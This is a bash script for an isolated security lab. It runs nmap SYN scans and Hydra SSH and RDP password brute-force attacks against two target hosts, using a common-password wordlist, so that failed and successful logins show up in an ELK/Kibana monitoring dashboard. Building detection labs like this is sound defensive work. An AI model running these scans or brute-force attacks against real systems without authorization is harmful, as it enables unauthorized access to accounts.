#!/usr/bin/env bash
# =============================================================================
# Attack Simulation Script (Kali Linux)
# Performs reconnaissance and credential testing against lab targets to
# generate security events for the ELK monitoring dashboard.
#
# Usage:
#   bash attack_simulation.sh <LINUX_TARGET_IP> <WINDOWS_TARGET_IP> [TARGET_PASSWORD] [RDP_USER]
#
# Examples:
#   # Interactive prompt (safest when passwords contain special chars like !):
#   bash attack_simulation.sh 192.168.1.11 192.168.1.12
#
#   # Direct argument (always wrap passwords containing ! in single quotes):
#   bash attack_simulation.sh 192.168.1.11 192.168.1.12 'Admin123!@#'
#
# WARNING: This script is for an ISOLATED LAB environment ONLY.
#          Unauthorized use against systems you do not own is illegal.
# =============================================================================
set -euo pipefail

LINUX_TARGET="${1:?Error: Provide the Linux target IP as the first argument.}"
WINDOWS_TARGET="${2:?Error: Provide the Windows target IP as the second argument.}"
INPUT_PASSWORD="${3:-}"
RDP_USER="${4:-testrdp}"

# Safely handle password input without bash history expansion issues
if [ -n "$INPUT_PASSWORD" ]; then
    TARGET_PASSWORD="$INPUT_PASSWORD"
elif [ -t 0 ]; then
    echo -n "[?] Enter correct password for lab brute-force demo (hidden) [default: ChangeMe_LabOnly]: "
    read -r -s TARGET_PASSWORD
    echo ""
    TARGET_PASSWORD="${TARGET_PASSWORD:-ChangeMe_LabOnly}"
else
    TARGET_PASSWORD="ChangeMe_LabOnly"
fi

WORDLIST="/tmp/lab_wordlist.txt"

# Always remove the wordlist (it ends with a real plaintext password) even if
# the script exits early or is interrupted.
trap 'rm -f "$WORDLIST"' EXIT

echo "============================================="
echo " Attack Simulation - Lab Environment"
echo " Linux Target (SSH) : ${LINUX_TARGET} (user: testuser)"
echo " Windows Target (RDP): ${WINDOWS_TARGET} (user: ${RDP_USER})"
echo "============================================="

# ---- 0. Check required tools ----
for tool in nmap hydra; do
    if ! command -v "$tool" &>/dev/null; then
        echo "[!] ${tool} is not installed. Installing..."
        apt-get update -y && apt-get install -y "$tool"
    fi
done

# ---- 1. Connectivity check ----
echo ""
echo "[*] Phase 1: Connectivity Check (ping)"
echo "-------------------------------------------"
for target in "$LINUX_TARGET" "$WINDOWS_TARGET"; do
    if ping -c 3 -W 2 "$target" &>/dev/null; then
        echo "[+] ${target} is reachable."
    else
        echo "[-] ${target} is NOT reachable. Check network."
    fi
done

# ---- 2. Nmap SYN scan ----
echo ""
echo "[*] Phase 2: Nmap SYN Scan (-sS)"
echo "-------------------------------------------"
echo "[*] Scanning Linux target (${LINUX_TARGET})..."
nmap -sS -Pn -T4 --top-ports 100 "$LINUX_TARGET" || true

echo ""
echo "[*] Scanning Windows host target (${WINDOWS_TARGET})..."
nmap -sS -Pn -T4 --top-ports 100 "$WINDOWS_TARGET" || true

# ---- 3. Generate password wordlist ----
echo ""
echo "[*] Phase 3: Generating password wordlist"
echo "-------------------------------------------"
cat > "$WORDLIST" << 'PASSWORDS'
wrongpass1
password
123456
admin
letmein
qwerty
abc123
monkey
master
dragon
login
welcome
shadow
sunshine
trustno1
PASSWORDS

# Append the CORRECT password at the end so brute force ends with a success
echo "${TARGET_PASSWORD}" >> "$WORDLIST"
chmod 600 "$WORDLIST"

TOTAL=$(wc -l < "$WORDLIST")
echo "[+] Wordlist created at ${WORDLIST} (${TOTAL} entries)."
echo "[+] Correct password is the LAST entry (simulates failed attempts then success)."

# ---- 4. SSH brute-force with Hydra ----
echo ""
echo "[*] Phase 4: SSH Credential Testing (Hydra)"
echo "-------------------------------------------"
echo "[*] Target: ${LINUX_TARGET} | User: testuser"
hydra -l testuser -P "$WORDLIST" ssh://"${LINUX_TARGET}" -t 4 -V -f || true

# ---- 5. RDP brute-force with Hydra ----
echo ""
echo "[*] Phase 5: RDP Credential Testing (Hydra)"
echo "-------------------------------------------"
echo "[*] Target: ${WINDOWS_TARGET} | User: ${RDP_USER}"
hydra -l "${RDP_USER}" -P "$WORDLIST" rdp://"${WINDOWS_TARGET}" -t 4 -V -f || true

# ---- 6. Cleanup ----
# (handled automatically by the EXIT trap above)

echo ""
echo "============================================="
echo " Attack simulation complete!"
echo " Check the Kibana dashboard for alerts:"
echo "   - Failed SSH logins  : message : \"Failed password\""
echo "   - Success SSH login  : message : \"Accepted password\""
echo "   - Failed RDP logins  : winlog.event_id : \"4625\""
echo "   - Success RDP login  : winlog.event_id : \"4624\""
echo "============================================="
